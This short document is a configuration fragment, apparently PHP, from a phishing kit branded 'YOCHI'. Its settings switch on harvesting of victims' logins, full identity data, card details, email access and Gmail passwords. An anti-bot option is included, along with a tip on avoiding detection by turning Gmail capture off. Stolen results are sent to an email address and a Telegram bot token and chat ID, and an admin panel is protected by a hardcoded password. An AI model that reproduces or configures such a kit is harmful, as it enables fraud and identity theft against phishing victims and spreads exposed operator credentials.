...
$grablogin=1;                      # <--- GRAB LOGIN
$grabfullz=1;                      # <--- GRAB FULLZ
$grabcard=1;                       # <--- GRAB CARD DETAILS
$grabemailaccess=1;                # <--- (ON/OFF) Email access grab
$grabgmail=1;                      # <--- (ON/OFF) >>(TURN OFF TO PREVENT REDFLAGGING.)<< GRAB GMAIL PASS
...
$useantibots=1;                    # <--- (ON/OFF) Antibots
$send = "rickysavor@yandex.com,";   # <--- YOUR EMAIL/EMAILS SEPARATED BY COMMAS
$tgbot = "6565841171:AAEtgEBndFbYEQt3xbf0Ry0C1BGO9JPfTFQ";         # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
$chatid = "1240879469";               # <--- YOUR TELEGRAM CHAT ID
$resultheading = "🎌 YOCHI 🎌";    # <--- WHAT YOUR RESULTS SHOULD DISPLAY AS TOP 
$adminpanel = 1;                   # <--- ENABLE ADMIN PANEL
$adminpass = "Donhacker042";                   # <--- YOUR PASSWORD TO VIEW ADMIN PANEL
